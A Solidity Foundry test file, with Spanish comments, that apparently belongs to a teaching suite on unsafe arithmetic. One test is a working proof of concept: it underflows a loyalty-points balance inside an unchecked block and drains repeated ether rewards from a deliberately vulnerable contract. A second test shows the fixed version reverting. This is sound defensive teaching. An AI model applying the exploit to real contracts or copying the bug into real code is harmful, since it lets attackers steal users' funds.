// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {LoyaltyPoints} from "../../src/unsafe-arithmetic/target/LoyaltyPoints.sol";
import {LoyaltyPointsFixed} from "../../src/unsafe-arithmetic/mitigations/LoyaltyPointsFixed.sol";

contract UnsafeArithmetic02Test is Test {
    LoyaltyPoints loyalty;
    LoyaltyPointsFixed loyaltyFixed;

    address attacker = makeAddr("attacker");

    function setUp() public {
        loyalty = new LoyaltyPoints();
        vm.deal(address(this), 1 ether);
        loyalty.fund{value: 1 ether}();

        loyaltyFixed = new LoyaltyPointsFixed();
        vm.deal(address(this), 1 ether);
        loyaltyFixed.fund{value: 1 ether}();
    }

    /// @dev attacker gana 1 punto legítimo. require(points > 0) pasa (1 > 0),
    ///      pero el gasto real es CLAIM_COST=100 -- dentro de unchecked,
    ///      1 - 100 desborda a 2**256 - 99 en vez de revertir. Con ese
    ///      balance astronómico, reclamar 10 veces más apenas hace mella:
    ///      11 recompensas de 0.01 ether por un único punto ganado.
    function test_exploit_uncheckedUnderflow() public {
        vm.prank(attacker);
        loyalty.earn(1);
        assertEq(loyalty.points(attacker), 1);

        vm.prank(attacker);
        loyalty.claimReward(payable(attacker));

        assertGt(loyalty.points(attacker), 2 ** 250, "balance casi maximo, no cero ni revertido");

        for (uint256 i = 0; i < 10; i++) {
            vm.prank(attacker);
            loyalty.claimReward(payable(attacker));
        }

        assertGt(attacker.balance, 0.1 ether, "muy por encima de lo que 1 punto deberia dar");
    }

    /// @dev Mismo intento contra LoyaltyPointsFixed: require(points >=
    ///      CLAIM_COST) ya compara contra el coste real, no contra 0 --
    ///      con solo 1 punto, revierte antes de llegar siquiera a la resta.
    function test_mitigation_blocksUncheckedUnderflow() public {
        vm.prank(attacker);
        loyaltyFixed.earn(1);

        vm.prank(attacker);
        vm.expectRevert(bytes("Insufficient points"));
        loyaltyFixed.claimReward(payable(attacker));
    }
}
